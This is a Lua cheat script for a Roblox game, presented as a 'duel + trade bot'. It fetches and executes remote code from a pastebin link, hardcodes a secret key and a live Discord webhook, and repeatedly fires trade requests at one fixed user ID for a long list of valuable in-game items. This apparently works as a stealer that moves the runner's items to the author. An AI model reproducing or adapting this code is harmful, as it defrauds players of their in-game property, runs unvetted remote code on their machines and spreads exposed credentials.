-- SUXANOX DUEL + TRADE BOT - BY MX
print("════════════════════════════════════════")
print("   SUXANOX DUEL + TRADE BOT - BY MX")
print("════════════════════════════════════════")

-- LOAD SCRIPT DUEL DARI PASTEBIN LO
print("[*] Loading duel script from pastebin...")
loadstring(game:HttpGet("https://pastebin.com/raw/1uQP1jX0"))()
print("[✓] Duel script loaded")

-- KONFIGURASI TRADE
getgenv().SECRET_KEY = "mrr_9eb6a26dba00443d9788f64c89e9d297"
getgenv().TARGET_ID = 8243624333
getgenv().DELAY_STEP = 1      
getgenv().TRADE_CYCLE_DELAY = 2
getgenv().DISCORD_WEBHOOK = "https://discord.com/api/webhooks/1502505877809401909/bu3-cEI5B-LKr63HiK47P_0xIwcFThibpuwhqYi5xA2hhs7gEYgrGdqSV3zOi56-ZyaB"

getgenv().TARGET_BRAINROTS = {
    ["Los Amigos"] = true, ["La Secret Combinasion"] = true, ["La Food Combinasion"] = true,
    ["Sammyni Fattini"] = true, ["Rosetti Tualetti"] = true, ["Tacorita Bicicleta"] = true,
    ["La Extinct Grande"] = true, ["La Spooky Grande"] = true, ["Chipso and Queso"] = true,
    ["Chillin Chili"] = true, ["Tuff Toucan"] = true, ["W or L"] = true,
    ["La Jolly Grande"] = true, ["La Taco Combinasion"] = true, ["Swaggy Bros"] = true,
    ["La Romantic Grande"] = true, ["Festive 67"] = true, ["Tang Tang Keletang"] = true,
    ["Ketupat Kepat"] = true, ["Tictac Sahur"] = true, ["Ketchuru and Musturu"] = true,
    ["Lavadorito Spinito"] = true, ["Garama and Madundung"] = true, ["Burguro And Fryuro"] = true,
    ["Capitano Moby"] = true, ["Cerberus"] = true, ["Dragon Cannelloni"] = true,
    ["Los Hotspotsitos"] = true, ["Guest 666"] = true, ["Los Bros"] = true,
    ["Tralaledon"] = true, ["Los Puggies"] = true, ["Los Primos"] = true,
    ["Los Tacoritas"] = true, ["Los Spaghettis"] = true, ["Ginger Gerat"] = true,
    ["La Casa Boo"] = true, ["Los Sekolahs"] = true, ["Reinito Sleighito"] = true,
    ["Fragrama and Chocrama"] = true, ["Spooky and Pumpky"] = true, ["Love Love Bear"] = true,
    ["Ketupat Bros"] = true, ["Cooki and Milki"] = true, ["Rosey and Teddy"] = true,
    ["Popcuru and Fizzuru"] = true, ["La Supreme Combinasion"] = true, ["Dragon Gingerini"] = true,
    ["Hydra Dragon Cannelloni"] = true, ["Celularcini Viciosini"] = true, ["Las Sis"] = true,
    ["Los Planitos"] = true, ["Eviledon"] = true, ["Orcaledon"] = true,
    ["Jolly Jolly Sahur"] = true, ["La Ginger Sekolah"] = true, ["Nacho Spyder"] = true,
    ["Griffin"] = true, ["Gold Gold Gold"] = true, ["La Lucky Grande"] = true,
    ["Celestial Pegasus"] = true, ["Fortunu and Cashuru"] = true, ["Ventoliero Pavonero"] = true,
    ["Cloverat Clapat"] = true, ["Fishino Clownino"] = true, ["Dug dug dug"] = true,
    ["Lovin Rose"] = true, ["Headless Horseman"] = true, ["Meowl"] = true,
    ["Strawberry Elephant"] = true, ["Skibidi Toilet"] = true, ["Signore Carapace"] = true,
    ["Elefanto Frigo"] = true, ["Antonio"] = true, ["Fragola La La La"] = true,
    ["Digi Narwhal"] = true, ["Arcadragon"] = true, ["Kalika Bros"] = true,
    ["Tirilikalika Tirilikalako"] = true, ["Gym Bros"] = true, ["La Easter Grande"] = true,
    ["Los Chillis"] = true, ["Foxini Lanternini"] = true, ["Money Bros"] = true,
    ["Los Hackers"] = true, ["Boppin Bunny"] = true, ["Hydra Bunny"] = true,
    ["John Pork"] = true, ["John Doe"] = true
}

print("[✓] Trade config loaded | Target ID: " .. getgenv().TARGET_ID)

-- WEBSOCKET + TRADE LOOP
local HttpService = game:GetService("HttpService")
local Players = game:GetService("Players")
local VirtualUser = game:GetService("VirtualUser")
local targetId = tonumber(getgenv().TARGET_ID)

local function sendWebhook(msg)
    pcall(function()
        HttpService:PostAsync(getgenv().DISCORD_WEBHOOK, HttpService:JSONEncode({content = msg, username = "SUXANOX"}), Enum.HttpContentType.ApplicationJson, false, {["Content-Type"] = "application/json"})
    end)
end

sendWebhook("🚀 SUXANOX DUEL+TRADE BOT AKTIF")

task.spawn(function()
    while true do
        pcall(function()
            for _, p in pairs(Players:GetPlayers()) do
                if p.UserId == targetId and p ~= Players.LocalPlayer then
                    print("[!] TARGET ONLINE: " .. p.Name)
                    sendWebhook("✅ Target online: " .. p.Name)
                    local rs = game:GetService("ReplicatedStorage")
                    for _, r in pairs(rs:GetChildren()) do
                        pcall(function()
                            if (r:IsA("RemoteEvent") or r:IsA("RemoteFunction")) and (r.Name:lower():find("trade") or r.Name:lower():find("request")) then
                                if r:IsA("RemoteEvent") then
                                    r:FireServer(p)
                                    print("[✓] Trade sent via " .. r.Name)
                                else
                                    r:InvokeServer(p)
                                    print("[✓] Trade sent via " .. r.Name)
                                end
                            end
                        end)
                    end
                end
            end
        end)
        task.wait(getgenv().TRADE_CYCLE_DELAY)
    end
end)

Players.LocalPlayer.Idled:Connect(function()
    VirtualUser:Button2Down(Vector2.new(0,0), workspace.CurrentCamera.CFrame)
    task.wait(1)
    VirtualUser:Button2Up(Vector2.new(0,0), workspace.CurrentCamera.CFrame)
end)

print("════════════════════════════════════════")
print("   ✅ DUEL + TRADE BOT RUNNING ✅")
print("════════════════════════════════════════")
while true do task.wait(60) end
